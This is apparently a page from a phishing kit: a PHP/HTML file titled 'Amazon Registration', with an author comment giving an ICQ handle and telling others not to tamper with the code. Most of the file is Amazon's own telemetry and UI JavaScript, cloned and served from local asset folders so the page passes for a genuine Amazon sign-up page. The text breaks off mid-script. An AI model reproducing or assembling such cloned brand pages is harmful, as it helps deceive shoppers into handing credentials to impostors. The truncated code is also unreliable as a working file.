<?php
/*
ICQ @labdata
Please don't fuck with my code.
*/
?>
<!DOCTYPE html>
<html class="a-ws a-js a-audio a-video a-canvas a-svg a-drag-drop a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-gradients a-transform3d a-touch-scrolling a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="dingo" data-aui-build-date="3.22.1-2022-06-23">

<head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <script async="" src="a3_files/31YXrY93hfL.js" crossorigin="anonymous"></script>
    <script type="text/javascript">
        var ue_t0 = ue_t0 || +new Date();
    </script>
    <script type="text/javascript">
        window.ue_ihb = (window.ue_ihb || window.ueinit || 0) + 1;
        if (window.ue_ihb === 1) {

            var ue_csm = window,
                ue_hob = +new Date();
            (function(d) {
                var e = d.ue = d.ue || {},
                    f = Date.now || function() {
                        return +new Date
                    };
                e.d = function(b) {
                    return f() - (b ? 0 : d.ue_t0)
                };
                e.stub = function(b, a) {
                    if (!b[a]) {
                        var c = [];
                        b[a] = function() {
                            c.push([c.slice.call(arguments), e.d(), d.ue_id])
                        };
                        b[a].replay = function(b) {
                            for (var a; a = c.shift();) b(a[0], a[1], a[2])
                        };
                        b[a].isStub = 1
                    }
                };
                e.exec = function(b, a) {
                    return function() {
                        try {
                            return b.apply(this, arguments)
                        } catch (c) {
                            ueLogError(c, {
                                attribution: a || "undefined",
                                logLevel: "WARN"
                            })
                        }
                    }
                }
            })(ue_csm);


            var ue_err_chan = 'jserr-rw';
            (function(d, e) {
                function h(f, b) {
                    if (!(a.ec > a.mxe) && f) {
                        a.ter.push(f);
                        b = b || {};
                        var c = f.logLevel || b.logLevel;
                        c && c !== k && c !== m && c !== n && c !== p || a.ec++;
                        c && c != k || a.ecf++;
                        b.pageURL = "" + (e.location ? e.location.href : "");
                        b.logLevel = c;
                        b.attribution = f.attribution || b.attribution;
                        a.erl.push({
                            ex: f,
                            info: b
                        })
                    }
                }

                function l(a, b, c, e, g) {
                    d.ueLogError({
                        m: a,
                        f: b,
                        l: c,
                        c: "" + e,
                        err: g,
                        fromOnError: 1,
                        args: arguments
                    }, g ? {
                        attribution: g.attribution,
                        logLevel: g.logLevel
                    } : void 0);
                    return !1
                }
                var k = "FATAL",
                    m = "ERROR",
                    n = "WARN",
                    p = "DOWNGRADED",
                    a = {
                        ec: 0,
                        ecf: 0,
                        pec: 0,
                        ts: 0,
                        erl: [],
                        ter: [],
                        mxe: 50,
                        startTimer: function() {
                            a.ts++;
                            setInterval(function() {
                                d.ue && a.pec < a.ec && d.uex("at");
                                a.pec = a.ec
                            }, 1E4)
                        }
                    };
                l.skipTrace = 1;
                h.skipTrace = 1;
                h.isStub = 1;
                d.ueLogError = h;
                d.ue_err = a;
                e.onerror = l
            })(ue_csm, window);


            var ue_id = 'VNE39923462MAN8CDC9Z',
                ue_url = '/ap/uedata',
                ue_navtiming = 1,
                ue_mid = 'ATVPDKIKX0DER',
                ue_sid = '133-0374257-6245133',
                ue_sn = 'www.amazon.com',
                ue_furl = 'fls-na.amazon.com',
                ue_surl = 'https://unagi-na.amazon.com/1/events/com.amazon.csm.nexusclient.prod',
                ue_int = 0,
                ue_fcsn = 1,
                ue_urt = 3,
                ue_rpl_ns = 'cel-rpl',
                ue_ddq = 1,
                ue_fpf = '//fls-na.amazon.com/1/batch/1/OP/ATVPDKIKX0DER:133-0374257-6245133:VNE39923462MAN8CDC9Z$uedata=s:',
                ue_sbuimp = 1,
                ue_ibft = 0,
                ue_fnt = 0,

                ue_swi = 1;
            var ue_viz = function() {
                (function(b, e, a) {
                    function k(c) {
                        if (b.ue.viz.length < p && !l) {
                            var a = c.type;
                            c = c.originalEvent;
                            /^focus./.test(a) && c && (c.toElement || c.fromElement || c.relatedTarget) || (a = e[m] || ("blur" == a || "focusout" == a ? "hidden" : "visible"), b.ue.viz.push(a + ":" + (+new Date - b.ue.t0)), "visible" == a && (b.ue.isl && q("at"), l = 1))
                        }
                    }
                    for (var l = 0, q = b.uex, f, g, m, n = ["", "webkit", "o", "ms", "moz"], d = 0, p = 20, h = 0; h < n.length && !d; h++)
                        if (a = n[h], f = (a ? a + "H" : "h") + "idden", d = "boolean" == typeof e[f]) g = a + "visibilitychange", m = (a ? a + "V" : "v") +
                            "isibilityState";
                    k({});
                    d && e.addEventListener(g, k, 0);
                    b.ue && d && (b.ue.pageViz = {
                        event: g,
                        propHid: f
                    })
                })(ue_csm, ue_csm.document, ue_csm.window)
            };

            (function(d, h, N) {
                function H(a) {
                    return a && a.replace && a.replace(/^\s+|\s+$/g, "")
                }

                function u(a) {
                    return "undefined" === typeof a
                }

                function B(a, b) {
                    for (var c in b) b[v](c) && (a[c] = b[c])
                }

                function I(a) {
                    try {
                        var b = N.cookie.match(RegExp("(^| )" + a + "=([^;]+)"));
                        if (b) return b[2].trim()
                    } catch (c) {}
                }

                function O(m, b, c) {
                    var q = (x || {}).type;
                    if ("device" !== c || 2 !== q && 1 !== q) m && (d.ue_id = a.id = a.rid = m, w && (w = w.replace(/((.*?:){2})(\w+)/, function(a, b) {
                        return b + m
                    })), D && (e("id", D, m), D = 0)), b && (w && (w = w.replace(/(.*?:)(\w|-)+/, function(a,
                        c) {
                        return c + b
                    })), d.ue_sid = b), c && a.tag("page-source:" + c), d.ue_fpf = w
                }

                function P() {
                    var a = {};
                    return function(b) {
                        b && (a[b] = 1);
                        b = [];
                        for (var c in a) a[v](c) && b.push(c);
                        return b
                    }
                }

                function y(d, b, c, q) {
                    q = q || +new E;
                    var f, l;
                    if (b || u(c)) {
                        if (d)
                            for (l in f = b ? e("t", b) || e("t", b, {}) : a.t, f[d] = q, c) c[v](l) && e(l, b, c[l]);
                        return q
                    }
                }

                function e(d, b, c) {
                    var e = b && b != a.id ? a.sc[b] : a;
                    e || (e = a.sc[b] = {});
                    "id" === d && c && (Q = 1);
                    return e[d] = c || e[d]
                }

                function R(d, b, c, e, f) {
                    c = "on" + c;
                    var l = b[c];
                    "function" === typeof l ? d && (a.h[d] = l) : l = function() {};
                    b[c] =
                        function(a) {
                            f ? (e(a), l(a)) : (l(a), e(a))
                        };
                    b[c] && (b[c].isUeh = 1)
                }

                function S(m, b, c, q) {
                    function p(b, c) {
                        var d = [b],
                            g = 0,
                            f = {},
                            l, h;
                        c ? (d.push("m=1"), f[c] = 1) : f = a.sc;
                        for (h in f)
                            if (f[v](h)) {
                                var q = e("wb", h),
                                    p = e("t", h) || {},
                                    n = e("t0", h) || a.t0,
                                    k;
                                if (c || 2 == q) {
                                    q = q ? g++ : "";
                                    d.push("sc" + q + "=" + h);
                                    for (k in p) u(p[k]) || null === p[k] || d.push(k + q + "=" + (p[k] - n));
                                    d.push("t" + q + "=" + p[m]);
                                    if (e("ctb", h) || e("wb", h)) l = 1
                                }
                            }! J && l && d.push("ctb=1");
                        return d.join("&")
                    }

                    function l(b, c, g, e) {
                        if (b) {
                            var f = d.ue_err;
                            d.ue_url && !e && b && 0 < b.length && (e = new Image,
                                a.iel.push(e), e.src = b, a.count && a.count("postbackImageSize", b.length));
                            if (w) {
                                var m = h.encodeURIComponent;
                                m && b && (e = new Image, b = "" + d.ue_fpf + m(b) + ":" + (+new E - d.ue_t0), a.iel.push(e), e.src = b)
                            } else a.log && (a.log(b, "uedata", {
                                n: 1
                            }), a.ielf.push(b));
                            f && !f.ts && f.startTimer();
                            a.b && (f = a.b, a.b = "", l(f, c, g, 1))
                        }
                    }

                    function A(b) {
                        var c = x ? x.type : F,
                            d = 2 == c || a.isBFonMshop,
                            c = c && !d,
                            e = a.bfini;
                        Q || (e && 1 < e && (b += "&bfform=1", c || (a.isBFT = e - 1)), d && (b += "&bfnt=1", a.isBFT = a.isBFT || 1), a.ssw && a.isBFT && (a.isBFonMshop && (a.isNRBF = 0), u(a.isNRBF) &&
                            (d = a.ssw(a.oid), d.e || u(d.val) || (a.isNRBF = 1 < d.val ? 0 : 1)), u(a.isNRBF) || (b += "&nrbf=" + a.isNRBF)), a.isBFT && !a.isNRBF && (b += "&bft=" + a.isBFT));
                        return b
                    }
                    if (!a.paused && (b || u(c))) {
                        for (var k in c) c[v](k) && e(k, b, c[k]);
                        a.isBFonMshop || y("pc", b, c);
                        k = "ld" === m && b && e("wb", b);
                        var s = e("id", b) || a.id;
                        k || s === a.oid || (D = b, ba(s, (e("t", b) || {}).tc || +e("t0", b), +e("t0", b)));
                        var s = e("id", b) || a.id,
                            t = e("id2", b),
                            g = a.url + "?" + m + "&v=" + a.v + "&id=" + s,
                            J = e("ctb", b) || e("wb", b),
                            z;
                        J && (g += "&ctb=" + J);
                        t && (g += "&id2=" + t);
                        1 < d.ueinit && (g += "&ic=" + d.ueinit);
                        if (!("ld" != m && "ul" != m || b && b != s)) {
                            if ("ld" == m) {
                                try {
                                    h[K] && h[K].isUeh && (h[K] = null)
                                } catch (I) {}
                                if (h.chrome)
                                    for (t = 0; t < L.length; t++) T(G, L[t]);
                                (t = N.ue_backdetect) && t.ue_back && t.ue_back.value++;
                                d._uess && (z = d._uess());
                                a.isl = 1
                            }
                            a._bf && (g += "&bf=" + a._bf());
                            d.ue_navtiming && f && (e("ctb", s, "1"), a.isBFonMshop || y("tc", F, F, M));
                            !C || a.isBFonMshop || U || (f && B(a.t, {
                                na_: f.navigationStart,
                                ul_: f.unloadEventStart,
                                _ul: f.unloadEventEnd,
                                rd_: f.redirectStart,
                                _rd: f.redirectEnd,
                                fe_: f.fetchStart,
                                lk_: f.domainLookupStart,
                                _lk: f.domainLookupEnd,
                                co_: f.connectStart,
                                _co: f.connectEnd,
                                sc_: f.secureConnectionStart,
                                rq_: f.requestStart,
                                rs_: f.responseStart,
                                _rs: f.responseEnd,
                                dl_: f.domLoading,
                                di_: f.domInteractive,
                                de_: f.domContentLoadedEventStart,
                                _de: f.domContentLoadedEventEnd,
                                _dc: f.domComplete,
                                ld_: f.loadEventStart,
                                _ld: f.loadEventEnd,
                                ntd: ("function" !== typeof C.now || u(M) ? 0 : new E(M + C.now()) - new E) + a.t0
                            }), x && B(a.t, {
                                ty: x.type + a.t0,
                                rc: x.redirectCount + a.t0
                            }), U = 1);
                            a.isBFonMshop || B(a.t, {
                                hob: d.ue_hob,
                                hoe: d.ue_hoe
                            });
                            a.ifr && (g += "&ifr=1")
                        }
                        y(m, b, c, q);
                        var r, n;
                        k || b &&
                            b !== s || ca(b);
                        (c = d.ue_mbl) && c.cnt && !k && (g += c.cnt());
                        k ? e("wb", b, 2) : "ld" == m && (a.lid = H(s));
                        for (r in a.sc)
                            if (1 == e("wb", r)) break;
                        if (k) {
                            if (a.s) return;
                            g = p(g, null)
                        } else c = p(g, null), c != g && (c = A(c), a.b = c), z && (g += z), g = p(g, b || a.id);
                        g = A(g);
                        if (a.b || k)
                            for (r in a.sc) 2 == e("wb", r) && delete a.sc[r];
                        z = 0;
                        a._rt && (g += "&rt=" + a._rt());
                        c = h.csa;
                        if (!k && c)
                            for (n in r = e("t", b) || {}, c = c("PageTiming"), r) r[v](n) && c("mark", da[n] || n, r[n]);
                        k || (a.s = 0, (n = d.ue_err) && 0 < n.ec && n.pec < n.ec && (n.pec = n.ec, g += "&ec=" + n.ec + "&ecf=" + n.ecf), z = e("ctb", b),
                            "ld" !== m || b || a.markers ? a.markers && a.isl && !k && b && B(a.markers, e("t", b)) : (a.markers = {}, B(a.markers, e("t", b))), e("t", b, {}));
                        a.tag && a.tag().length && (g += "&csmtags=" + a.tag().join("|"), a.tag = P());
                        n = a.viz || [];
                        (r = n.length) && (g += "&viz=" + n.splice(0, r).join("|"));
                        u(d.ue_pty) || (g += "&pty=" + d.ue_pty + "&spty=" + d.ue_spty + "&pti=" + d.ue_pti);
                        a.tabid && (g += "&tid=" + a.tabid);
                        a.aftb && (g += "&aftb=1");
                        !a._ui || b && b != s || (g += a._ui());
                        a.a = g;
                        l(g, m, z, k)
                    }
                }

                function ca(a) {
                    var b = h.ue_csm_markers || {},
                        c;
                    for (c in b) b[v](c) && y(c, a, F, b[c])
                }

                function A(a, b, c) {
                    c = c || h;
                    if (c[V]) c[V](a, b, !1);
                    else if (c[W]) c[W]("on" + a, b)
                }

                function T(a, b, c) {
                    c = c || h;
                    if (c[X]) c[X](a, b, !1);
                    else if (c[Y]) c[Y]("on" + a, b)
                }

                function Z() {
                    function a() {
                        d.onUl()
                    }

                    function b(a) {
                        return function() {
                            c[a] || (c[a] = 1, S(a))
                        }
                    }
                    var c = {},
                        e, f;
                    d.onLd = b("ld");
                    d.onLdEnd = b("ld");
                    d.onUl = b("ul");
                    e = {
                        stop: b("os")
                    };
                    h.chrome ? (A(G, a), L.push(a)) : e[G] = d.onUl;
                    for (f in e) e[v](f) && R(0, h, f, e[f]);
                    d.ue_viz && ue_viz();
                    A("load", d.onLd);
                    y("ue")
                }

                function ba(e, b, c) {
                    var f = d.ue_mbl,
                        p = h.csa,
                        l = p && p("SPA"),
                        p = p && p("PageTiming");
                    f && f.ajax && f.ajax(b, c);
                    l && p && (l("newPage", {
                        requestId: e,
                        transitionType: "soft"
                    }), p("mark", "transitionStart", b));
                    a.tag("ajax-transition")
                }
                d.ueinit = (d.ueinit || 0) + 1;
                var a = d.ue = d.ue || {};
                a.t0 = h.aPageStart || d.ue_t0;
                a.id = d.ue_id;
                a.url = d.ue_url;
                a.rid = d.ue_id;
                a.a = "";
                a.b = "";
                a.h = {};
                a.s = 1;
                a.t = {};
                a.sc = {};
                a.iel = [];
                a.ielf = [];
                a.viz = [];
                a.v = "0.227786.0";
                a.paused = !1;
                var v = "hasOwnProperty",
                    G = "beforeunload",
                    K = "on" + G,
                    V = "addEventListener",
                    X = "removeEventListener",
                    W = "attachEvent",
                    Y = "detachEvent",
                    da = {
                        cf: "criticalFeature",
                        af: "aboveTheFold",
                        fn: "functional",
                        fp: "firstPaint",
                        fcp: "firstContentfulPaint",
                        bb: "bodyBegin",
                        be: "bodyEnd",
                        ld: "loaded"
                    },
                    E = h.Date,
                    C = h.performance || h.webkitPerformance,
                    f = (C || {}).timing,
                    x = (C || {}).navigation,
                    M = (f || {}).navigationStart,
                    w = d.ue_fpf,
                    Q = 0,
                    U = 0,
                    L = [],
                    D = 0,
                    F;
                a.oid = H(a.id);
                a.lid = H(a.id);
                a._t0 = a.t0;
                a.tag = P();
                a.ifr = h.top !== h.self || h.frameElement ? 1 : 0;
                a.markers = null;
                a.attach = A;
                a.detach = T;
                if ("000-0000000-8675309" === d.ue_sid) {
                    var $ = I("cdn-rid"),
                        aa = I("session-id");
                    $ && aa && O($, aa, "cdn")
                }
                d.uei = Z;
                d.ueh = R;
                d.ues = e;
                d.uet = y;
                d.uex =
                    S;
                a.reset = O;
                a.pause = function(d) {
                    a.paused = d
                };
                Z()
            })(ue_csm, ue_csm.window, ue_csm.document);


            ue.stub(ue, "log");
            ue.stub(ue, "onunload");
            ue.stub(ue, "onflush");
            (function(c) {
                var a = c.ue;
                a.cv = {};
                a.cv.scopes = {};
                a.count = function(d, c, b) {
                    var e = {},
                        f = a.cv,
                        g = b && 0 === b.c;
                    e.counter = d;
                    e.value = c;
                    e.t = a.d();
                    b && b.scope && (f = a.cv.scopes[b.scope] = a.cv.scopes[b.scope] || {}, e.scope = b.scope);
                    if (void 0 === c) return f[d];
                    f[d] = c;
                    d = 0;
                    b && b.bf && (d = 1);
                    ue_csm.ue_sclog || !a.clog || 0 !== d || g ? a.log && a.log(e, "csmcount", {
                        c: 1,
                        bf: d
                    }) : a.clog(e, "csmcount", {
                        bf: d
                    })
                };
                a.count("baselineCounter2", 1);
                a && a.event && (a.event({
                        requestId: c.ue_id || "rid",
                        server: c.ue_sn || "sn",
                        obfuscatedMarketplaceId: c.ue_mid || "mid"
                    },
                    "csm", "csm.CSMBaselineEvent.4"), a.count("nexusBaselineCounter", 1, {
                    bf: 1
                }))
            })(ue_csm);



            var ue_hoe = +new Date();
        }
        window.ueinit = window.ue_ihb;
    </script>

    <!-- 4gfhd7uypnnvinhmgmcx1sfuf5v48a90i4zl4go737p9b -->
    <script>
        window.ue && ue.count && ue.count('CSMLibrarySize', 9637)
    </script>
    <script>
        var aPageStart = (new Date()).getTime();
    </script>
    <meta charset="utf-8">
    <title dir="ltr">Amazon Registration</title>





    <link rel="stylesheet" href="assets/css/61A6IErPNXL.css">
    <link rel="stylesheet" href="assets/css/01SdjaY0ZsL.css">
    <link rel="stylesheet" href="assets/css/113GJdhRnnL.css">
    <script>
        (function(g, h, O, C) {
            function D(a) {
                u && u.tag && u.tag(q(":", "aui", a))
            }

            function v(a, b) {
                u && u.count && u.count("aui:" + a, 0 === b ? 0 : b || (u.count("aui:" + a) || 0) + 1)
            }

            function m(a) {
                try {
                    return a.test(navigator.userAgent)
                } catch (b) {
                    return !1
                }
            }

            function x(a, b, c) {
                a.addEventListener ? a.addEventListener(b, c, !1) : a.attachEvent && a.attachEvent("on" + b, c)
            }

            function q(a, b, c, e) {
                b = b && c ? b + a + c : b || c;
                return e ? q(a, b, e) : b
            }

            function E(a, b, c) {
                try {
                    Object.defineProperty(a, b, {
                        value: c,
                        writable: !1
                    })
                } catch (e) {
                    a[b] = c
                }
                return c
            }

            function qa(a, b, c) {
                var e =
                    c = a.length,
                    f = function() {
                        e-- || (P.push(b), Q || (setTimeout(aa, 0), Q = !0))
                    };
                for (f(); c--;) ba[a[c]] ? f() : (y[a[c]] = y[a[c]] || []).push(f)
            }

            function ra(a, b, c, e, f) {
                var d = h.createElement(a ? "script" : "link");
                x(d, "error", e);
                f && x(d, "load", f);
                a ? (d.type = "text/javascript", d.async = !0, c && /AUIClients|images[/]I/.test(b) && d.setAttribute("crossorigin", "anonymous"), d.src = b) : (d.rel = "stylesheet", d.href = b);
                h.getElementsByTagName("head")[0].appendChild(d)
            }

            function ca(a, b) {
                return function(c, e) {
                    function f() {
                        ra(b, c, d, function(b) {
                            R ? v("resource_unload") :
                                d ? (d = !1, v("resource_retry"), f()) : (v("resource_error"), a.log("Asset failed to load: " + c));
                            b && b.stopPropagation ? b.stopPropagation() : g.event && (g.event.cancelBubble = !0)
                        }, e)
                    }
                    if (da[c]) return !1;
                    da[c] = !0;
                    v("resource_count");
                    var d = !0;
                    return !f()
                }
            }

            function sa(a, b, c) {
                for (var e = {
                        name: a,
                        guard: function(c) {
                            return b.guardFatal(a, c)
                        },
                        guardTime: function(a) {
                            return b.guardTime(a)
                        },
                        logError: function(c, d, f) {
                            b.logError(c, d, f, a)
                        }
                    }, f = [], d = 0; d < c.length; d++) F.hasOwnProperty(c[d]) && (f[d] = S.hasOwnProperty(c[d]) ? S[c[d]](F[c[d]],
                    e) : F[c[d]]);
                return f
            }

            function z(a, b, c, e, f) {
                return function(d, h) {
                    function n() {
                        var a = null;
                        e ? a = h : "function" === typeof h && (p.start = w(), a = h.apply(g, sa(d, k, l)), p.end = w());
                        if (b) {
                            F[d] = a;
                            a = d;
                            for (ba[a] = !0;
                                (y[a] || []).length;) y[a].shift()();
                            delete y[a]
                        }
                        p.done = !0
                    }
                    var k = f || this;
                    "function" === typeof d && (h = d, d = C);
                    b && (d = d ? d.replace(ea, "") : "__NONAME__", T.hasOwnProperty(d) && k.error(q(", reregistered by ", q(" by ", d + " already registered", T[d]), k.attribution), d), T[d] = k.attribution);
                    for (var l = [], m = 0; m < a.length; m++) l[m] =
                        a[m].replace(ea, "");
                    var p = A[d || "anon" + ++ta] = {
                        depend: l,
                        registered: w(),
                        namespace: k.namespace
                    };
                    d && ua.hasOwnProperty(d);
                    c ? n() : qa(l, k.guardFatal(d, n), d);
                    return {
                        decorate: function(a) {
                            S[d] = k.guardFatal(d, a)
                        }
                    }
                }
            }

            function fa(a) {
                return function() {
                    var b = Array.prototype.slice.call(arguments);
                    return {
                        execute: z(b, !1, a, !1, this),
                        register: z(b, !0, a, !1, this)
                    }
                }
            }

            function U(a, b) {
                return function(c, e) {
                    e || (e = c, c = C);
                    var f = this.attribution;
                    return function() {
                        t.push(b || {
                            attribution: f,
                            name: c,
                            logLevel: a
                        });
                        var d = e.apply(this, arguments);
                        t.pop();
                        return d
                    }
                }
            }

            function G(a, b) {
                this.load = {
                    js: ca(this, !0),
                    css: ca(this)
                };
                E(this, "namespace", b);
                E(this, "attribution", a)
            }

            function ha() {
                h.body ? p.trigger("a-bodyBegin") : setTimeout(ha, 20)
            }

            function B(a, b) {
                a.className = V(a, b) + " " + b
            }

            function V(a, b) {
                return (" " + a.className + " ").split(" " + b + " ").join(" ").replace(/^ | $/g, "")
            }

            function ia(a) {
                try {
                    return a()
                } catch (b) {
                    return !1
                }
            }

            function H() {
                if (I) {
                    var a = {
                        w: g.innerWidth || n.clientWidth,
                        h: g.innerHeight || n.clientHeight
                    };
                    5 < Math.abs(a.w - W.w) || 50 < a.h - W.h ? (W = a, J = 4, (a = k.mobile ||
                        k.tablet ? 450 < a.w && a.w > a.h : 1250 <= a.w) ? B(n, "a-ws") : n.className = V(n, "a-ws")) : 0 < J && (J--, ja = setTimeout(H, 16))
                }
            }

            function va(a) {
                (I = a === C ? !I : !!a) && H()
            }

            function wa() {
                return I
            }
            "use strict";
            var K = O.now = O.now || function() {
                    return +new O
                },
                w = function(a) {
                    return a && a.now ? a.now.bind(a) : K
                }(g.performance),
                L = w(),
                ua = {},
                r = g.AmazonUIPageJS || g.P;
            if (r && r.when && r.register) {
                L = [];
                for (var l = h.currentScript; l; l = l.parentElement) l.id && L.push(l.id);
                return r.log("A copy of P has already been loaded on this page.", "FATAL", L.join(" "))
            }
            var u =
                g.ue;
            D();
            D("aui_build_date:3.22.1-2022-06-23");
            var P = [],
                xa = [],
                Q = !1;
            var aa = function() {
                for (var a = setTimeout(aa, 0), b = K(); xa.length || P.length;)
                    if (P.shift()(), 50 < K() - b) return;
                clearTimeout(a);
                Q = !1
            };
            var ba = {},
                y = {},
                da = {},
                R = !1;
            x(g, "beforeunload", function() {
                R = !0;
                setTimeout(function() {
                    R = !1
                }, 1E4)
            });
            var ea = /^prv:/,
                T = {},
                F = {},
                S = {},
                A = {},
                ta = 0,
                X = String.fromCharCode(92),
                t = [],
                ka = !0,
                la = g.onerror;
            g.onerror = function(a, b, c, e, f) {
                f && "object" === typeof f || (f = Error(a, b, c), f.columnNumber = e, f.stack = b || c || e ? q(X, f.message, "at " +
                    q(":", b, c, e)) : C);
                var d = t.pop() || {};
                f.attribution = q(":", f.attribution || d.attribution, d.name);
                f.logLevel = d.logLevel;
                f.attribution && console && console.log && console.log([f.logLevel || "ERROR", a, "thrown by", f.attribution].join(" "));
                t = [];
                la && (d = [].slice.call(arguments), d[4] = f, la.apply(g, d))
            };
            G.prototype = {
                logError: function(a, b, c, e) {
                    b = {
                        message: b,
                        logLevel: c || "ERROR",
                        attribution: q(":", this.attribution, e)
                    };
                    if (g.ueLogError) return g.ueLogError(a || b, a ? b : null), !0;
                    console && console.error && (console.log(b), console.error(a));
                    return !1
                },
                error: function(a, b, c, e) {
                    a = Error(q(":", e, a, c));
                    a.attribution = q(":", this.attribution, b);
                    throw a;
                },
                guardError: U(),
                guardFatal: U("FATAL"),
                guardCurrent: function(a) {
                    var b = t[t.length - 1];
                    return b ? U(b.logLevel, b).call(this, a) : a
                },
                guardTime: function(a) {
                    var b = t[t.length - 1],
                        c = b && b.name;
                    return c && c in A ? function() {
                        var b = w(),
                            f = a.apply(this, arguments);
                        A[c].async = (A[c].async || 0) + w() - b;
                        return f
                    } : a
                },
                log: function(a, b, c) {
                    return this.logError(null, a, b, c)
                },
                declare: z([], !0, !0, !0),
                register: z([], !0),
                execute: z([]),
                AUI_BUILD_DATE: "3.22.1-2022-06-23",
                when: fa(),
                now: fa(!0),
                trigger: function(a, b, c) {
                    var e = K();
                    this.declare(a, {
                        data: b,
                        pageElapsedTime: e - (g.aPageStart || NaN),
                        triggerTime: e
                    });
                    c && c.instrument && M.when("prv:a-logTrigger").execute(function(b) {
                        b(a)
                    })
                },
                handleTriggers: function() {
                    this.log("handleTriggers deprecated")
                },
                attributeErrors: function(a) {
                    return new G(a)
                },
                _namespace: function(a, b) {
                    return new G(a, b)
                },
                setPriority: function(a) {
                    ka ? ka = !1 : this.log("setPriority only accept the first call.")
                }
            };
            var p = E(g, "AmazonUIPageJS",
                new G);
            var M = p._namespace("PageJS", "AmazonUI");
            M.declare("prv:p-debug", A);
            p.declare("p-recorder-events", []);
            p.declare("p-recorder-stop", function() {});
            E(g, "P", p);
            ha();
            if (h.addEventListener) {
                var ma;
                h.addEventListener("DOMContentLoaded", ma = function() {
                    p.trigger("a-domready");
                    h.removeEventListener("DOMContentLoaded", ma, !1)
                }, !1)
            }
            var n = h.documentElement,
                Y = function() {
                    var a = ["O", "ms", "Moz", "Webkit"],
                        b = h.createElement("div");
                    return {
                        testGradients: function() {
                            return !0
                        },
                        test: function(c) {
                            var e = c.charAt(0).toUpperCase() +
                                c.substr(1);
                            c = (a.join(e + " ") + e + " " + c).split(" ");
                            for (e = c.length; e--;)
                                if ("" === b.style[c[e]]) return !0;
                            return !1
                        },
                        testTransform3d: function() {
                            return !0
                        }
                    }
                }();
            r = n.className;
            var na = /(^| )a-mobile( |$)/.test(r),
                oa = /(^| )a-tablet( |$)/.test(r),
                k = {
                    audio: function() {
                        return !!h.createElement("audio").canPlayType
                    },
                    video: function() {
                        return !!h.createElement("video").canPlayType
                    },
                    canvas: function() {
                        return !!h.createElement("canvas").getContext
                    },
                    svg: function() {
                        return !!h.createElementNS && !!h.createElementNS("http://www.w3.org/2000/svg",
                            "svg").createSVGRect
                    },
                    offline: function() {
                        return navigator.hasOwnProperty && navigator.hasOwnProperty("onLine") && navigator.onLine
                    },
                    dragDrop: function() {
                        return "draggable" in h.createElement("span")
                    },
                    geolocation: function() {
                        return !!navigator.geolocation
                    },
                    history: function() {
                        return !(!g.history || !g.history.pushState)
                    },
                    webworker: function() {
                        return !!g.Worker
                    },
                    autofocus: function() {
                        return "autofocus" in h.createElement("input")
                    },
                    inputPlaceholder: function() {
                        return "placeholder" in h.createElement("input")
                    },
                    textareaPlaceholder: function() {
                        return "placeholder" in
                            h.createElement("textarea")
                    },
                    localStorage: function() {
                        return "localStorage" in g && null !== g.localStorage
                    },
                    orientation: function() {
                        return "orientation" in g
                    },
                    touch: function() {
                        return "ontouchend" in h
                    },
                    gradients: function() {
                        return Y.testGradients()
                    },
                    hires: function() {
                        var a = g.devicePixelRatio && 1.5 <= g.devicePixelRatio || g.matchMedia && g.matchMedia("(min-resolution:144dpi)").matches;
                        v("hiRes" + (na ? "Mobile" : oa ? "Tablet" : "Desktop"), a ? 1 : 0);
                        return a
                    },
                    transform3d: function() {
                        return Y.testTransform3d()
                    },
                    touchScrolling: function() {
                        return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|SOFTWARE=([5-9]|[1-9][0-9]+)(.[0-9]{1,2})+.*DEVICE=iPhone|Chrome|Silk|Firefox|Trident.+?; Touch/i)
                    },
                    ios: function() {
                        return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i) && !m(/trident|Edge/i)
                    },
                    android: function() {
                        return m(/android.([1-9]|[L-Z])/i) && !m(/trident|Edge/i)
                    },
                    mobile: function() {
                        return na
                    },
                    tablet: function() {
                        return oa
                    },
                    rtl: function() {
                        return "rtl" === n.dir
                    }
                };
            for (l in k) k.hasOwnProperty(l) && (k[l] = ia(k[l]));
            for (var Z = "textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "), N = 0; N < Z.length; N++) k[Z[N]] = ia(function() {
                return Y.test(Z[N])
            });
            var I = !0,
                ja = 0,
                W = {
                    w: 0,
                    h: 0
                },
                J = 4;
            H();
            x(g, "resize", function() {
                clearTimeout(ja);
                J = 4;
                H()
            });
            var pa = {
                getItem: function(a) {
                    try {
                        return g.localStorage.getItem(a)
                    } catch (b) {}
                },
                setItem: function(a, b) {
                    try {
                        return g.localStorage.setItem(a, b)
                    } catch (c) {}
                }
            };
            n.className = V(n, "a-no-js");
            B(n, "a-js");
            !m(/OS [1-8](_[0-9]*)+ like Mac OS X/i) || g.navigator.standalone || m(/safari/i) || B(n, "a-ember");
            r = [];
            for (l in k) k.hasOwnProperty(l) && k[l] && r.push("a-" + l.replace(/([A-Z])/g, function(a) {
                return "-" + a.toLowerCase()
            }));
            B(n, r.join(" "));
            n.setAttribute("data-aui-build-date",
                "3.22.1-2022-06-23");
            p.register("p-detect", function() {
                return {
                    capabilities: k,
                    localStorage: k.localStorage && pa,
                    toggleResponsiveGrid: va,
                    responsiveGridEnabled: wa
                }
            });
            m(/UCBrowser/i) || k.localStorage && B(n, pa.getItem("a-font-class"));
            p.declare("a-event-revised-handling", !1);
            p.execute("RetailPageServiceWorker", function() {
                function a() {
                    e.forEach(function(a) {
                        D(a)
                    })
                }

                function b(a, b, c) {
                    if (b) {
                        a = m(/Chrome/i) && !m(/Edge/i) && !m(/OPR/i) && !a.capabilities.isAmazonApp && !m(new RegExp(X + "bwv" + X + "b"));
                        var d = "sw:browser:" + c +
                            ":";
                        b.browser && a && (e.push(d + "supported"), b.browser.action(d, c));
                        !a && b.browser && e.push(d + "unsupported")
                    }
                }
                try {
                    var c = navigator.serviceWorker
                } catch (f) {
                    D("sw:nav_err")
                }
                c && (x(c, "message", function(a) {
                    a && a.data && v(a.data.k, a.data.v)
                }), c.controller && c.controller.postMessage("MSG-RDY"));
                var e = [];
                (function(f) {
                    var d = f.reg,
                        h = f.unreg;
                    c && c.getRegistrations ? (M.when("A").execute(function(a) {
                        b(a, h, "unregister")
                    }), x(g, "load", function() {
                        M.when("A").execute(function(c) {
                            b(c, d, "register");
                            a()
                        })
                    })) : (d && d.browser && e.push("sw:browser:register:unsupported"),
